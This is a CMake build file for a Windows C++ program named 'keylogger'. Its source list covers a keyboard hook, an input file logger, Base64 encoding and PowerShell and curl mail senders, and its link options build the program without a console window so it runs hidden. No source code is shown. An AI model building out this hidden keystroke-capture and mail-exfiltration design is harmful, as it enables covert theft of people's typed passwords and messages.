
set(SOURCES
		DefaultFileSystemAccess.cpp
		KeyloggerDirectoryLocator.cpp
		Base64Encryptor.cpp
        TimestampFetcher.cpp
        PowerShellMailSender.cpp
        CurlMailSender.cpp
		Timer.cpp
		UserInputFileLogger.cpp
		Helper.cpp
		KeyboardHook.h
		Keylogger.cpp
		)

add_executable(keylogger ${SOURCES} "Main.cpp")

target_compile_options(keylogger PRIVATE -std=c++20 /permissive-)
target_include_directories(keylogger PRIVATE
        ${CURL_INCLUDE_DIR}
		)
target_link_libraries(keylogger PRIVATE libcurl)
target_link_options(keylogger PRIVATE "/SUBSYSTEM:WINDOWS" "/ENTRY:mainCRTStartup")

